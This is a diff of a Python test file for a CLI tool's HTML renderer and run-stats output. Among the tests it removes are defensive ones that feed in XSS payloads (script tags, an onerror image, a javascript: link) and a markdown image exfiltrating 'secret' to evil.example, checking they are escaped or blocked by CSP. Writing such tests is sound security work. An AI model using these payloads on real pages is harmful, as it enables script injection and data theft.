@@ -262,24 +262,6 @@ def test_workspace_error_without_history_propagates(pipeline):
     assert isinstance(result.exception, cli.UserError)
 
 
-def test_write_render_writes_html_under_state_dir(tmp_path, monkeypatch):
-    monkeypatch.chdir(tmp_path)
-    path = cli._write_render(tmp_path / "state", "hello world", "# Hi\n\nSee `x`.")
-    assert path == tmp_path / "state" / "renders" / "hello-world.html"
-    assert "<h1>Hi</h1>" in path.read_text()
-    assert not (tmp_path / ".mrai").exists()
-
-
-def test_host_path_maps_container_state_dir_to_host(tmp_path, monkeypatch):
-    state = tmp_path / "state"
-    inside = state / "renders" / "x.html"
-    assert cli._host_path(inside, state) == inside
-    monkeypatch.setenv("MRAI_HOST_DIR", "/home/u/.mrai/workspaces/repo-1234abcd")
-    assert cli._host_path(inside, state) == cli.Path(
-        "/home/u/.mrai/workspaces/repo-1234abcd/renders/x.html"
-    )
-
-
 def test_resolve_mrai_dir_precedence(tmp_path, monkeypatch):
     repo = tmp_path / "repo"
     default = cli.resolve_mrai_dir(None, repo)
@@ -297,20 +279,19 @@ def test_default_state_dir_differs_per_workspace(tmp_path):
     assert a == cli.resolve_mrai_dir(None, tmp_path / "x" / "api")
 
 
-def test_render_escapes_html_from_the_answer(tmp_path):
-    hostile = "<script>alert(1)</script> <img src=x onerror=alert(1)> [x](javascript:alert(1))"
-    html = cli._write_render(tmp_path, "t", hostile).read_text()
-    body = html.split("<body>", 1)[1]
-    assert "<script>alert" not in body and "&lt;script&gt;" in body
-    assert "<img" not in body
-    assert 'href="javascript:' not in body
-
-
-def test_render_csp_allows_only_its_own_script(tmp_path):
-    html = cli._write_render(tmp_path, "t", "![](https://evil.example/?d=secret)").read_text()
-    csp = html.split('http-equiv="Content-Security-Policy" content="', 1)[1].split('"', 1)[0]
-    script = html.rsplit("<script>", 1)[1].split("</script>", 1)[0]
-    digest = cli.base64.b64encode(cli.hashlib.sha256(script.encode()).digest()).decode()
-    assert f"'sha256-{digest}'" in csp
-    assert "img-src data:" in csp
-    assert html.count('integrity="sha512-') == 2
+def test_stats_markdown_is_a_labelled_table():
+    stats = cli.RunStats(
+        cost=None,
+        jev=0.000074,
+        requests=9,
+        tools=cli.Counter({"read_file": 6, "git_diff": 2}),
+        web=["https://x.example/a|b"],
+    )
+    md = cli._stats_markdown(stats)
+    assert md.startswith(cli.STATS_MARKER)
+    assert "| Run stats | |" in md
+    assert "| Cost | unavailable |" in md
+    assert "| Jev | $0.000074 |" in md
+    assert "| Requests | 9 |" in md
+    assert "| Tool calls (8) | `read_file` 6 · `git_diff` 2 |" in md
+    assert "| Web fetches | https://x.example/a\\|b |" in md
